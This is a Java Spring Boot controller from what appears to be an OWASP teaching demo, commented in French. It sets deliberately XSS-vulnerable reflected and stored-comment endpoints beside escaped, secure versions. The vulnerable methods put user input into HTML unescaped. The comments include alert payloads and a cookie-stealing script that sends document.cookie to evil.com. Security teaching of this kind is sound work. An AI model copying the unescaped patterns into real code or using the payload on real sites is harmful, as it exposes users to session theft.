package com.example.owaspdemo.demo;

import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.Parameter;
import io.swagger.v3.oas.annotations.tags.Tag;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.util.HtmlUtils;

import java.util.*;

/**
 * ============================================================================
 *  A03:2021 - CROSS-SITE SCRIPTING (XSS)
 * ============================================================================
 *
 *  XSS se produit quand une application inclut des donnees non fiables dans
 *  une page web sans les echapper correctement.
 *
 *  Types de XSS :
 *  - Reflected : la saisie est renvoyee directement dans la reponse
 *  - Stored    : la saisie malveillante est stockee en base et renvoyee plus tard
 *  - DOM-based : le script manipule le DOM cote client
 *
 *  ENDPOINTS DE DEMO :
 *    VULNERABLE : GET  /api/a03/vulnerable/greet?name=x
 *    SECURISE   : GET  /api/a03/secure/greet?name=x
 *    VULNERABLE : POST /api/a03/vulnerable/comment
 *    SECURISE   : POST /api/a03/secure/comment
 * ============================================================================
 */
@RestController
@RequestMapping("/api/a03")
@Tag(name = "A03 - XSS")
public class A03_XSSDemo {

    // Simule un stockage de commentaires
    private final List<Map<String, String>> vulnerableComments = new ArrayList<>();
    private final List<Map<String, String>> secureComments = new ArrayList<>();

    // ========================================================================
    //  XSS REFLECTED
    // ========================================================================

    /**
     * VULNERABLE : la saisie est renvoyee directement dans le HTML sans echappement.
     *
     * Attaque : GET /api/a03/vulnerable/greet?name=<script>alert('XSS')</script>
     *
     * Le navigateur execute le JavaScript injecte.
     * L'attaquant peut voler des cookies, rediriger l'utilisateur, etc.
     */
    @Operation(summary = "[VULNERABLE] XSS Reflected",
               description = "Essayez name = `<script>alert('XSS')</script>`. Le script s'execute dans le navigateur.")
    @GetMapping(value = "/vulnerable/greet", produces = "text/html")
    public String vulnerableGreet(@Parameter(example = "<script>alert('XSS')</script>") @RequestParam String name) {
        // DANGEREUX : insertion directe dans le HTML
        return "<html><body>"
             + "<h1>Bonjour " + name + " !</h1>"
             + "<p>Cette page est vulnerable au XSS reflected.</p>"
             + "</body></html>";
    }

    /**
     * SECURISE : echappement HTML de la saisie utilisateur.
     *
     * HtmlUtils.htmlEscape() convertit les caracteres speciaux :
     *   < -> &lt;
     *   > -> &gt;
     *   " -> &quot;
     *   & -> &amp;
     *
     * Le script <script>alert('XSS')</script> devient du texte inoffensif.
     */
    @Operation(summary = "[SECURISE] XSS Reflected protege",
               description = "HtmlUtils.htmlEscape() convertit < > en &lt; &gt;. Le script devient du texte.")
    @GetMapping(value = "/secure/greet", produces = "text/html")
    public String secureGreet(@Parameter(example = "<script>alert('XSS')</script>") @RequestParam String name) {
        // SECURISE : echappement HTML
        String safeName = HtmlUtils.htmlEscape(name);
        return "<html><body>"
             + "<h1>Bonjour " + safeName + " !</h1>"
             + "<p>Cette page est protegee contre le XSS (echappement HTML).</p>"
             + "</body></html>";
    }

    // ========================================================================
    //  XSS STORED
    // ========================================================================

    /**
     * VULNERABLE : le commentaire est stocke tel quel puis rendu sans echappement.
     *
     * Attaque : POST /api/a03/vulnerable/comment
     *   body: {"author":"hacker","content":"<script>document.location='https://evil.com/steal?c='+document.cookie</script>"}
     *
     * Tous les utilisateurs qui lisent les commentaires executent le script.
     */
    @Operation(summary = "[VULNERABLE] XSS Stored - Ajouter",
               description = "Le contenu est stocke sans sanitization. Body: {\"author\":\"hacker\",\"content\":\"<script>alert(1)</script>\"}")
    @PostMapping("/vulnerable/comment")
    public Map<String, Object> vulnerableAddComment(@RequestBody Map<String, String> comment) {
        // DANGEREUX : stocke le contenu sans aucune sanitization
        vulnerableComments.add(comment);
        return Map.of("status", "Commentaire ajoute (sans sanitization)", "total", vulnerableComments.size());
    }

    @Operation(summary = "[VULNERABLE] XSS Stored - Lire",
               description = "Les scripts stockes s'executent quand on affiche les commentaires.")
    @GetMapping(value = "/vulnerable/comments", produces = "text/html")
    public String vulnerableListComments() {
        StringBuilder html = new StringBuilder("<html><body><h1>Commentaires (vulnerable)</h1>");
        for (Map<String, String> c : vulnerableComments) {
            // DANGEREUX : insertion directe du contenu dans le HTML
            html.append("<div><b>").append(c.get("author")).append("</b>: ")
                .append(c.get("content")).append("</div>");
        }
        html.append("</body></html>");
        return html.toString();
    }

    /**
     * SECURISE : echappement du contenu avant stockage.
     */
    @Operation(summary = "[SECURISE] XSS Stored - Ajouter (echappe)",
               description = "Le contenu est echappe avec HtmlUtils avant stockage.")
    @PostMapping("/secure/comment")
    public Map<String, Object> secureAddComment(@RequestBody Map<String, String> comment) {
        // SECURISE : echapper le contenu AVANT le stockage
        Map<String, String> safeComment = Map.of(
            "author", HtmlUtils.htmlEscape(comment.getOrDefault("author", "")),
            "content", HtmlUtils.htmlEscape(comment.getOrDefault("content", ""))
        );
        secureComments.add(safeComment);
        return Map.of("status", "Commentaire ajoute (echappe)", "total", secureComments.size());
    }

    @Operation(summary = "[SECURISE] XSS Stored - Lire (safe)",
               description = "Le contenu echappe s'affiche comme du texte.")
    @GetMapping(value = "/secure/comments", produces = "text/html")
    public String secureListComments() {
        StringBuilder html = new StringBuilder("<html><body><h1>Commentaires (securise)</h1>");
        for (Map<String, String> c : secureComments) {
            // Le contenu est deja echappe au stockage
            html.append("<div><b>").append(c.get("author")).append("</b>: ")
                .append(c.get("content")).append("</div>");
        }
        html.append("<p><i>Contenu echappe avec HtmlUtils.htmlEscape()</i></p>");
        html.append("</body></html>");
        return html.toString();
    }
}
